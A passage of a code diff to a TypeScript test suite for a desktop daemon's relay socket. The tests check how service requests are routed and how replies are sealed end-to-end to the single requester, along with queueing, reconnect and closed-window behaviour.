+ *  as the daemon runs it: its core reads the grid name and this machine's name off the socket. */
+function serveModels(socket: BackendSocket, over: Parameters<typeof fakeCore>[0] = {}) {
+  const ports = emptyPorts()
+  const host = createServiceHost(ports, { log: () => {} })
+  const core = fakeCore({
+    dataDir: process.env.ADAPTER_DATA_DIR,
+    ...over,
+    account: { privateGridName: async () => socket.gridName(), machineName: () => socket.machineName(), ...over.account },
+    clients: { gridModelsChanged: () => { void socket.pushGridModels() }, ...over.clients },
+  })
+  host.start('models', startModels, core, MODELS_FALLBACKS, MODELS_REQUESTS)
+  socket.serviceRouter = (type, payload, asker, reply) => host.route(type, payload, asker, reply)
+  socket.models = () => ports.models ?? MODELS_OFF
+  return host
+}
+
+/** The machine monitor (services/monitor.ts) in `host`, reading this machine as the daemon does unless a
+ *  spec says otherwise; its totals through the module, so a spy on it is what answers. */
+function serveMonitor(host: ReturnType<typeof createServiceHost>, over: Partial<MonitorDeps> = {}) {
+  host.start('monitor', (core, ports) => startMonitor(core, ports, {
+    machine: () => machineResources.readMachineResources(),
+    resources: createHarnessResourcesReader(() => registry.advertised()),
+    storage: createHarnessStorageReader(),
+    ...over,
+  }), fakeCore(), MONITOR_FALLBACKS, MONITOR_REQUESTS)
+  return host
+}
+
+/** The project and folder readers (services/projects.ts) answering `socket`, over the registry as the
+ *  daemon's core API reads it, so a spec's spies on the registry are what they see. */
+function serveProjects(socket: BackendSocket) {
+  return serveOn(socket, (host) => host.serve('projects', startProjects, fakeCore({
+    agents: { live: () => registry.list(), resolve: (id: string) => registry.resolve(id) },
+  }), PROJECTS_REQUESTS))
+}
+
+/** A socket whose service requests go to the services `serve` starts in a host of their own. */
+function serveOn(socket: BackendSocket, serve: (host: ReturnType<typeof createServiceHost>) => void) {
+  const host = createServiceHost(emptyPorts(), { log: () => {} })
+  serve(host)
+  socket.serviceRouter = (type, payload, asker, reply) => host.route(type, payload, asker, reply)
+  return host
+}
+
+/** The session a requester holds whenever its sealed request was opened. Replies of a sealed type go back
+ *  sealed to it; this stub seals them transparently, so a test reads the reply as the client does, opened. */
+function withSession(socket: BackendSocket, connId: string): void {
+  vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockImplementation((id) => id === connId)
+  vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockImplementation((_id, type, requestId, payload) => ({ type, payload: { requestId, ...payload } }))
 }
 
 describe('BackendSocket outbound queue', () => {
@@ -562,7 +714,7 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('queues web and device frames before open and flushes them in FIFO order', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
 
@@ -580,12 +732,51 @@ describe('BackendSocket outbound queue', () => {
     await socket.stop()
   })
 
+  it('sends a frame though the orchestrator watching the frames cannot read its state', async () => {
+    // A full disk: reading the orchestrator's state makes its folder, and that threw out of every send,
+    // so a turn's end never reached a window (e2e/diskfull.e2e.ts).
+    const socket = relaySocket('token')
+    socket.onFrameSent = () => { throw new Error('ENOSPC: no space left on device, mkdir') }
+    socket.connect()
+    const ws = wsMock.instances[0]
+    ws.open()
+    socket.send({ type: 'turn_ended', dbSessionId: 's1', payload: { sessionId: 's1' } })
+    expect(parseSent(ws).map((sent) => (sent.frame as { type?: string }).type)).toContain('turn_ended')
+    await socket.stop()
+  })
+
+  it('signed out, seals and queues nothing for a cloud link that never opens, and still serves its windows', async () => {
+    const socket = relaySocket('token')
+    const internal = { e2ee: gatewayOf(socket).e2ee, get queue() { return upstreamOf(socket).queue } }
+    const frames: Array<{ type?: unknown }> = []
+    socket.registerLocalClient('local:window', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
+    try {
+      // Sent at start-up, before the daemon has looked for a session: queued, as for any daemon.
+      socket.send({ type: 'turn_started', dbSessionId: 's1', payload: { sessionId: 's1' } })
+      expect(internal.queue).toHaveLength(1)
+      const wrapUp = vi.spyOn(internal.e2ee, 'wrapUp')
+      const wrapCommander = vi.spyOn(internal.e2ee, 'wrapCommander')
+      socket.serveThisComputerOnly()
+      expect(internal.queue).toHaveLength(0)
+      for (let i = 0; i < 100; i++) socket.send({ type: 'text_delta', dbSessionId: 's1', payload: { content: `word ${i}` } })
+      socket.sendCommander({ type: 'commander_event', agentId: 's1', dbSessionId: 's1', payload: { kind: 'done', text: 'done' } })
+      socket.sendUser({ type: 'notification', payload: {} })
+      expect(wrapUp).not.toHaveBeenCalled()
+      expect(wrapCommander).not.toHaveBeenCalled()
+      expect(internal.queue).toHaveLength(0)
+      expect(frames.filter((frame) => frame.type === 'text_delta')).toHaveLength(100)
+    } finally {
+      await socket.unregisterLocalClient('local:window')
+      await socket.stop()
+    }
+  })
+
   it('bounds the opening handshake and reconnects when it times out', async () => {
     // A connect attempt whose TCP side came up but whose upgrade was never answered used to sit in
     // CONNECTING forever: no 'open', so no heartbeat to terminate it, and `this.ws` set, so every
     // later connect() returned early. The daemon then showed "cloud reconnecting…" until restarted.
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws1 = wsMock.instances[0]
     expect(ws1.options?.handshakeTimeout).toBe(15_000)
@@ -613,7 +804,7 @@ describe('BackendSocket outbound queue', () => {
     // what every macOS DarkWake looked like from inside the daemon: the pre-sleep ping's pong never
     // came, so the first tick after wake terminated a link that was about to work again.
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -636,7 +827,7 @@ describe('BackendSocket outbound queue', () => {
     // A backend busy streaming data can answer a control-frame ping late; the data itself is the
     // stronger proof, and the backend pings this socket every 25s on its own.
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -674,7 +865,7 @@ describe('BackendSocket outbound queue', () => {
       vi.useFakeTimers()
       const statuses: boolean[] = []
       const { auth, calls } = authStub(async () => 'fresh-token')
-      const socket = new BackendSocket('0123456789abcdef0123456789abcdef', auth, (connected) => statuses.push(connected))
+      const socket = relaySocket('0123456789abcdef0123456789abcdef', auth, (connected) => statuses.push(connected))
       const revoked = vi.fn()
       socket.onRevoked = revoked
       socket.connect()
@@ -700,7 +891,7 @@ describe('BackendSocket outbound queue', () => {
     it('keeps the session and backs off when the refresh merely fails', async () => {
       vi.useFakeTimers()
       const { auth } = authStub(async () => { throw new AuthSessionError('service unavailable', 'UNAVAILABLE') })
-      const socket = new BackendSocket('0123456789abcdef0123456789abcdef', auth)
+      const socket = relaySocket('0123456789abcdef0123456789abcdef', auth)
       const revoked = vi.fn()
       socket.onRevoked = revoked
       socket.connect()
@@ -718,7 +909,7 @@ describe('BackendSocket outbound queue', () => {
     it('signs out only when the refresh token itself is rejected', async () => {
       vi.useFakeTimers()
       const { auth } = authStub(async () => { throw new AuthSessionError('refresh token is invalid', 'INVALID_REFRESH') })
-      const socket = new BackendSocket('0123456789abcdef0123456789abcdef', auth)
+      const socket = relaySocket('0123456789abcdef0123456789abcdef', auth)
       const revoked = vi.fn()
       socket.onRevoked = revoked
       socket.connect()
@@ -735,13 +926,14 @@ describe('BackendSocket outbound queue', () => {
 
   it('keeps a frame queued when ws.send reports an error and retries after reconnect', async () => {
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws1 = wsMock.instances[0]
     ws1.open()
     ws1.failNextSend = new Error('boom')
 
-    socket.sendTo('conn-1', { type: 'e2e_rekey', payload: { n: 1 } })
+    // A frame the gateway targets at one relayed connection (its own sends: the handshake, a rekey).
+    ;(gatewayOf(socket) as any).sendTo('conn-1', { type: 'e2e_rekey', payload: { n: 1 } })
     expect(ws1.sent).toHaveLength(0)
 
     await vi.advanceTimersByTimeAsync(1_000)
@@ -755,8 +947,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('routes e2e control frames to the handshake manager instead of the RPC fallback', async () => {
-    const socket = new BackendSocket('token')
-    const handle = vi.spyOn(socket.e2ee, 'handleFrame').mockReturnValue(true)
+    const socket = relaySocket('token')
+    const handle = vi.spyOn(gatewayOf(socket).e2ee, 'handleFrame').mockReturnValue(true)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -775,18 +967,18 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('serves the opaque runtime catalog through the existing models_list RPC', async () => {
-    const socket = new BackendSocket('token')
-    socket.runtimeModelsProvider = async () => [
+    const socket = relaySocket('token')
+    serveModels(socket, { agents: { runtimeModels: async () => [
       { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high', displayName: 'GPT-5.6 Sol / High' },
-    ]
+    ] } })
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'models_list', payload: { requestId: 'models-1' },
     })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'models_list_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     ws.message({
@@ -808,97 +1000,249 @@ describe('BackendSocket outbound queue', () => {
     await socket.stop()
   })
 
-  it('answers session_search from the index, sealed to the requester', async () => {
-    const socket = new BackendSocket('token')
-    const asked: Array<[string, number | undefined]> = []
-    socket.sessionSearchProvider = (query, options) => {
-      asked.push([query, options.limit])
-      return { hits: [], indexed: 3, pending: 0, ready: true, tookMs: 1 }
+  it('hands a request a service declared to the service router with who asked, and seals its answer to the requester', async () => {
+    const socket = relaySocket('token')
+    const routed: Array<{ type: string; payload: Record<string, unknown>; asker: unknown }> = []
+    socket.serviceRouter = (type, payload, asker, reply) => {
+      routed.push({ type, payload, asker })
+      if (type !== 'session_search') return false
+      reply({ hits: [], indexed: 3, pending: 0, ready: true, tookMs: 1 })
+      return true
     }
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    const unwrap = vi.spyOn(socket.e2ee, 'unwrapDown')
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
-      type: 'session_search_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
-    })
+    const unwrap = vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown')
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('web')
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockImplementation((_connId, type) => ({
+      type, payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
+    }))
     const envelope = { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } }
-    unwrap.mockReturnValueOnce({ type: 'session_search', payload: { requestId: 's-1', query: 'dial scroll', limit: 12 } })
-    ws.message({ t: 'down', connId: 'web-1', frame: { type: 'session_search', payload: envelope } })
+    const ask = (type: string, payload: Record<string, unknown>) => {
+      unwrap.mockReturnValueOnce({ type, payload })
+      ws.message({ t: 'down', connId: 'web-1', frame: { type, payload: envelope } })
+    }
+
+    // The owner's paired app, over the relay: sealed back to it, under its own request id.
+    ask('session_search', { requestId: 's-1', query: 'dial scroll', limit: 12 })
     await vi.waitFor(() => {
       expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_search_result', 's-1', { hits: [], indexed: 3, pending: 0, ready: true, tookMs: 1 })
     })
-    expect(asked).toEqual([['dial scroll', 12]])
+    expect(routed[0]).toEqual({ type: 'session_search', payload: { requestId: 's-1', query: 'dial scroll', limit: 12 }, asker: { local: false, owner: true, connection: 'web-1', requestId: 's-1' } })
 
-    // A machine whose Node has no node:sqlite says so rather than going silent.
-    socket.sessionSearchProvider = null
-    unwrap.mockReturnValueOnce({ type: 'session_search', payload: { requestId: 's-2', query: 'dial' } })
-    ws.message({ t: 'down', connId: 'web-1', frame: { type: 'session_search', payload: envelope } })
-    await vi.waitFor(() => {
-      expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_search_result', 's-2', { error: 'SEARCH_UNAVAILABLE' })
-    })
+    // A device's session may not act as the owner, and the service is told so.
+    role.mockReturnValue('device')
+    ask('session_search', { requestId: 's-2', query: 'dial' })
+    await vi.waitFor(() => expect(routed).toHaveLength(2))
+    expect(routed[1].asker).toEqual({ local: false, owner: false, connection: 'web-1', requestId: 's-2' })
 
-    // A search service that failed (core/serviceHost.ts) answers this one request, and says the
-    // client may ask again — never INTERNAL, and never the whole socket.
-    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    socket.sessionSearchProvider = () => { throw new ServiceUnavailableError('search', new Error('disk I/O error')) }
-    unwrap.mockReturnValueOnce({ type: 'session_search', payload: { requestId: 's-3', query: 'dial' } })
-    ws.message({ t: 'down', connId: 'web-1', frame: { type: 'session_search', payload: envelope } })
-    await vi.waitFor(() => {
-      expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_search_result', 's-3', { error: 'SERVICE_UNAVAILABLE', service: 'search', retryable: true })
-    })
-    expect(warn).toHaveBeenCalledWith('[backend] session_search: the search service is unavailable')
+    // A type no service declared is the socket's own: an unknown one is refused at once, in the clear,
+    // as a reply that carries nothing is.
+    role.mockReturnValue('web')
+    ask('nobody_answers', { requestId: 'n-1' })
+    await vi.waitFor(() => expect(parseSent(ws)).toContainEqual({ t: 'up', targetConnId: 'web-1', frame: { type: 'nobody_answers_result', payload: { requestId: 'n-1', error: 'UNSUPPORTED' } } }))
+    expect(routed.at(-1)?.type).toBe('nobody_answers')
+
+    // A process on this machine asks as itself, and as the owner.
+    const frames: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:app', { sendFrame: (frame) => { frames.push(frame as Record<string, unknown>); return true }, sendBinary: () => true })
+    socket.handleLocalFrame('local:app', { type: 'session_search', payload: { requestId: 'l-1', query: 'dial' } })
+    await vi.waitFor(() => expect(frames).toContainEqual(expect.objectContaining({ type: 'session_search_result' })))
+    expect(routed.at(-1)?.asker).toEqual({ local: true, owner: true, connection: 'local:app', requestId: 'l-1' })
     await socket.stop()
   })
 
-  it('answers session_tail from the index, sealed to the requester, and says what it cannot', async () => {
-    const socket = new BackendSocket('token')
-    const asked: Array<[string, number | undefined, number | undefined]> = []
-    const tail = { sessionId: 'sess-1', rows: [{ turn: 4, at: 1, ask: 'fix the dial', answer: 'Done.', tools: '' }], hasMore: true, total: 5, lastAt: 1 }
-    socket.sessionTailProvider = async (sessionId, options) => {
-      asked.push([sessionId, options.beforeTurn, options.maxChars])
-      return sessionId === 'sess-1' ? tail : null
+  it('tells the services when a connection that may have asked them closes: a window, a remote client, the relay and its clients', async () => {
+    const socket = relaySocket('token')
+    const closed: string[] = []
+    socket.onConnectionClosed = (connId) => { closed.push(connId) }
+    socket.registerLocalClient('local:window', { sendFrame: () => true, sendBinary: () => true })
+    await socket.unregisterLocalClient('local:window')
+    const client = { role: 'web' as const, label: null, identity: 'id', direct: false }
+    for (const connId of ['web-1', 'web-2', 'web-3']) socket.fromGateway.client(connId, client)
+    socket.fromGateway.client('web-1', null)
+    // One the gateway never announced is no connection of the socket's.
+    socket.fromGateway.client('web-unknown', null)
+    await socket.fromGateway.disconnected('web-2')
+    // The relay gone: every remote client it still had went with it, and no window on this computer did.
+    socket.registerLocalClient('local:stays', { sendFrame: () => true, sendBinary: () => true })
+    socket.fromGateway.linkDown()
+    expect(closed).toEqual(['local:window', 'web-1', 'web-2', 'web-3'])
+    await socket.stop()
+  })
+
+  it('answers a request whose service is unavailable SERVICE_UNAVAILABLE, retryable, and goes on', async () => {
+    const socket = relaySocket('token')
+    // A request whose work reaches a service through its port, whose fallback is to fail (core/serviceHost.ts).
+    bindTerminalRequests(socket, { applyTheme: () => { throw new ServiceUnavailableError('models', new Error('disk I/O error')) } })
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
+    const frames: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:app', { sendFrame: (frame) => { frames.push(frame as Record<string, unknown>); return true }, sendBinary: () => true })
+    socket.handleLocalFrame('local:app', { type: 'theme_set', payload: { requestId: 't-1', foreground: '#ffffff', background: '#000000' } })
+    await vi.waitFor(() => expect(frames).toContainEqual({ type: 'theme_set_result', payload: { requestId: 't-1', error: 'SERVICE_UNAVAILABLE', service: 'models', retryable: true } }))
+    expect(warn).toHaveBeenCalledWith('[backend] theme_set: the models service is unavailable')
+    await socket.stop()
+  })
+
+  it('answers terminal_info, which the terminal streams pass over, and leaves every other terminal frame to them', async () => {
+    const socket = relaySocket('token')
+    bindTerminalRequests(socket)
+    // As in the daemon: a stream manager that takes its own frames and passes over the rest.
+    const handleFrame = vi.fn(async (_connId: string, type: string) => type !== 'terminal_info' && type !== 'terminal_unknown')
+    socket.setTerminalStreamManager({ handleFrame, closeConnection: vi.fn(async () => {}), stop: vi.fn(async () => {}) } as unknown as TerminalStreamManager)
+    const frames: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:hn', { sendFrame: (frame) => { frames.push(frame as Record<string, unknown>); return true }, sendBinary: () => true })
+    socket.handleLocalFrame('local:hn', { type: 'terminal_info', payload: { requestId: 'i-1', agentId: 'no-such-agent' } })
+    await vi.waitFor(() => expect(frames).toContainEqual({ type: 'terminal_info_result', payload: { requestId: 'i-1', error: 'AGENT_NOT_FOUND' } }))
+    expect(handleFrame).toHaveBeenCalledWith('local:hn', 'terminal_info', expect.objectContaining({ agentId: 'no-such-agent' }))
+    // A terminal frame the streams take, or one nobody knows, is not answered here.
+    socket.handleLocalFrame('local:hn', { type: 'terminal_resize', payload: { requestId: 'r-1', streamId: 's' } })
+    socket.handleLocalFrame('local:hn', { type: 'terminal_unknown', payload: { requestId: 'u-1' } })
+    await vi.waitFor(() => expect(handleFrame).toHaveBeenCalledTimes(3))
+    await new Promise((resolve) => setTimeout(resolve, 50))
+    expect(frames.filter((frame) => frame.type !== 'terminal_info_result')).toEqual([])
+    await socket.stop()
+  })
+
+  it('drops a reply for a window that has gone: no other window hears it, and nothing of it is queued for the relay', async () => {
+    // A window that closes with requests in flight has them carried out, and their replies used to fall
+    // through to the broadcast: a plaintext one to every other window and, unsealed, to the relay; a
+    // sealed type to the relay as a targeted error (e2e/windows.e2e.ts). One answer of each kind.
+    const socket = relaySocket('token')
+    const answers = new Map<string, (result: Record<string, unknown>) => void>()
+    socket.serviceRouter = (type, payload, _asker, reply) => {
+      if (type !== 'terminal_info' && type !== 'session_search') return false
+      answers.set(String(payload.requestId), reply)
+      return true
     }
+    // Signed out, as on a computer nobody signed in to: whatever is meant for the relay waits in the queue.
+    socket.connect()
+    const ws = wsMock.instances[0]
+    const stays: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:stays', { sendFrame: (frame) => { stays.push(frame as Record<string, unknown>); return true }, sendBinary: () => true })
+    socket.registerLocalClient('local:gone', { sendFrame: () => true, sendBinary: () => true })
+    socket.handleLocalFrame('local:gone', { type: 'terminal_info', payload: { requestId: 'gone-info', agentId: 'a1' } })
+    socket.handleLocalFrame('local:gone', { type: 'session_search', payload: { requestId: 'gone-search', query: 'dial' } })
+    socket.handleLocalFrame('local:stays', { type: 'terminal_info', payload: { requestId: 'stays-info', agentId: 'a1' } })
+    await vi.waitFor(() => expect(answers.size).toBe(3))
+    await socket.unregisterLocalClient('local:gone')
+    const log = vi.spyOn(console, 'log').mockImplementation(() => {})
+    const wasOn = env.LOG_FRAMES
+    env.LOG_FRAMES = true
+    try {
+      answers.get('gone-info')!({ command: 'node', path: '/work/app', pid: 4242, tty: '/dev/ttys001' })
+      answers.get('gone-search')!({ hits: [], indexed: 0, pending: 0, ready: true, tookMs: 1 })
+    } finally {
+      env.LOG_FRAMES = wasOn
+    }
+    answers.get('stays-info')!({ command: 'node', path: '/work/app', pid: 4242, tty: '/dev/ttys001' })
+    // The window that stayed hears its own answer and nothing else.
+    expect(stays.map((frame) => (frame.payload as { requestId?: unknown } | undefined)?.requestId).filter(Boolean)).toEqual(['stays-info'])
+    // The gone window's answers are said once, in the diagnostic log, and go nowhere: not into the
+    // relay's queue, and not up the link once it opens.
+    expect(log.mock.calls.filter(([line]) => String(line).includes('has gone'))).toHaveLength(1)
+    expect(JSON.stringify(upstreamOf(socket).queue)).not.toContain('gone-')
+    ws.open()
+    expect(JSON.stringify(parseSent(ws))).not.toContain('gone-')
+    // A request from the relay is still answered on the relay, sealed to the session that asked.
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockImplementation((connId) => connId === 'web-1')
+    vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockImplementation((_connId, type) => ({ type, payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } } }))
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValueOnce({ type: 'terminal_info', payload: { requestId: 'relay-info', agentId: 'a1' } })
+    ws.message({ t: 'down', connId: 'web-1', frame: { type: 'terminal_info', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } } })
+    await vi.waitFor(() => expect(answers.has('relay-info')).toBe(true))
+    answers.get('relay-info')!({ error: 'AGENT_NOT_FOUND' })
+    expect(parseSent(ws)).toContainEqual({ t: 'up', targetConnId: 'web-1', frame: { type: 'terminal_info_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } } } })
+    await socket.stop()
+  })
+
+  it('answers a request from the relay to the requester alone: no other web client and no window gets a copy', async () => {
+    // Each app takes a reply by its own request id; a broadcast handed every web client of the machine
+    // and every window on it an answer only one of them had asked for.
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    const unwrap = vi.spyOn(socket.e2ee, 'unwrapDown')
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
-      type: 'session_tail_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
-    })
-    const envelope = { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } }
-    const ask = (payload: Record<string, unknown>) => {
-      unwrap.mockReturnValueOnce({ type: 'session_tail', payload })
-      ws.message({ t: 'down', connId: 'web-1', frame: { type: 'session_tail', payload: envelope } })
-    }
-    ask({ requestId: 't-1', sessionId: 'sess-1', beforeTurn: 9, maxChars: 8000 })
-    await vi.waitFor(() => expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_tail_result', 't-1', tail))
-    // Only whole numbers page; anything else asks for the last rows.
-    ask({ requestId: 't-2', sessionId: 'sess-1', beforeTurn: '9', maxChars: 1.5 })
-    await vi.waitFor(() => expect(asked).toHaveLength(2))
-    expect(asked).toEqual([['sess-1', 9, 8000], ['sess-1', undefined, undefined]])
-    ask({ requestId: 't-3', sessionId: 'nope' })
-    await vi.waitFor(() => expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_tail_result', 't-3', { error: 'NOT_INDEXED', sessionId: 'nope' }))
-    ask({ requestId: 't-4' })
-    await vi.waitFor(() => expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_tail_result', 't-4', { error: 'BAD_SESSION' }))
-    socket.sessionTailProvider = null
-    ask({ requestId: 't-5', sessionId: 'sess-1' })
-    await vi.waitFor(() => expect(wrapReply).toHaveBeenCalledWith('web-1', 'session_tail_result', 't-5', { error: 'SEARCH_UNAVAILABLE' }))
+    const window: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame as Record<string, unknown>); return true }, sendBinary: () => true })
+    // A paired client's request, sealed, of a type whose answer carries nothing: answered in the clear.
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValueOnce({ type: 'nobody_answers', payload: { requestId: 'r-1' } })
+    ws.message({ t: 'down', connId: 'web-1', frame: { type: 'nobody_answers', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } } })
+    const answers = () => parseSent(ws).filter((item) => (item.frame as { type?: string })?.type === 'nobody_answers_result')
+    await vi.waitFor(() => expect(answers()).toHaveLength(1))
+    expect(answers()).toEqual([{ t: 'up', targetConnId: 'web-1', frame: { type: 'nobody_answers_result', payload: { requestId: 'r-1', error: 'UNSUPPORTED' } } }])
+    expect(window.filter((frame) => frame.type === 'nobody_answers_result')).toEqual([])
+    // The backend's own request has no connection to be answered on: it still hears its answer on the bus.
+    ws.message({ t: 'down', connId: '', frame: { type: 'voice_route', payload: { requestId: 'b-1', transcript: 'route this' } } })
+    await vi.waitFor(() => expect(parseSent(ws)).toContainEqual({ t: 'up', frame: { type: 'voice_route_result', payload: { requestId: 'b-1', error: 'E2EE_REQUIRED' } } }))
     await socket.stop()
   })
+
+  it('seals what a pane runs to a requester that holds a session, and to it alone', async () => {
+    // A pane's folder, pid and tty used to go to every web client in the clear. Every client that holds a
+    // session opens a sealed payload of any type.
+    const socket = relaySocket('token')
+    // `terminal_info` is the core's (core/terminals/requests.ts), bound here as the daemon binds it.
+    bindTerminalRequests(socket)
+    socket.connect()
+    const ws = wsMock.instances[0]
+    ws.open()
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockImplementation((connId) => connId === 'web-1')
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockImplementation((_connId, type) => ({ type, payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } } }))
+    const unwrap = vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown')
+    const ask = (connId: string, type: string, payload: Record<string, unknown>) => {
+      unwrap.mockReturnValueOnce({ type, payload })
+      ws.message({ t: 'down', connId, frame: { type, payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } } })
+    }
+    const answers = () => parseSent(ws).filter((item) => (item.frame as { type?: unknown })?.type === 'terminal_info_result')
+    ask('web-1', 'terminal_info', { requestId: 'info-1', agentId: 'no-such-agent' })
+    await vi.waitFor(() => expect(answers()).toHaveLength(1))
+    expect(wrap).toHaveBeenCalledWith('web-1', 'terminal_info_result', 'info-1', { error: 'AGENT_NOT_FOUND' })
+    const sealed = { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } }
+    expect(answers()).toEqual([
+      { t: 'up', targetConnId: 'web-1', frame: { type: 'terminal_info_result', payload: sealed } },
+    ])
+    // A requester whose session went away meanwhile gets the bare refusal a refused request gets, never
+    // the answer in the clear.
+    ask('web-2', 'terminal_info', { requestId: 'info-2', agentId: 'no-such-agent' })
+    await vi.waitFor(() => expect(answers()).toHaveLength(2))
+    expect(answers()[1]).toEqual({ t: 'up', targetConnId: 'web-2', frame: { type: 'terminal_info_result', payload: { requestId: 'info-2', error: 'E2EE_REQUIRED' } } })
+    // Only the reply: the request keeps the rule it had, since an older daemon reads a sealed one as empty.
+    expect(encryptDownFrame('terminal_info')).toBe(false)
+    expect(encryptDownFrameFor('terminal_info', { strictDown: true })).toBe(false)
+    expect(encryptRpcResult('terminal_info_result')).toBe(true)
+    await socket.stop()
+  })
+
+  it.each(['dsh_list', 'dsh_install', 'dsh_update', 'dsh_remove', 'engines_probe', 'grid_models_list', 'claude_login_status', 'agent_retarget', 'remote_terminal_handoff'])(
+    'seals the %s answer to a requester that holds a session, and to it alone', async (type) => {
+      // What a machine tells the client that asked about it went to every web client in the clear.
+      const socket = relaySocket('token')
+      socket.connect()
+      const ws = wsMock.instances[0]
+      ws.open()
+      vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+      const sealed = { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } }
+      const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockImplementation((_connId, resultType) => ({ type: resultType, payload: sealed }))
+      ;(socket as unknown as { emitReply(connId: string, type: string, requestId: unknown, payload: Record<string, unknown>): void })
+        .emitReply('web-1', type, 'r-1', { account: 'this-computer' })
+      expect(wrap).toHaveBeenCalledWith('web-1', `${type}_result`, 'r-1', { account: 'this-computer' })
+      expect(parseSent(ws).filter((item) => (item.frame as { type?: unknown })?.type === `${type}_result`))
+        .toEqual([{ t: 'up', targetConnId: 'web-1', frame: { type: `${type}_result`, payload: sealed } }])
+      expect(JSON.stringify(parseSent(ws))).not.toContain('this-computer')
+      await socket.stop()
+    })
 
   it('hands theme_set to the host-theme sink and acknowledges it to the requester', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const received: unknown[] = []
-    socket.hostThemeSink = (theme) => received.push(theme)
+    bindTerminalRequests(socket, { applyTheme: (theme) => { received.push(theme) } })
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    const unwrap = vi.spyOn(socket.e2ee, 'unwrapDown')
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    const unwrap = vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown')
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
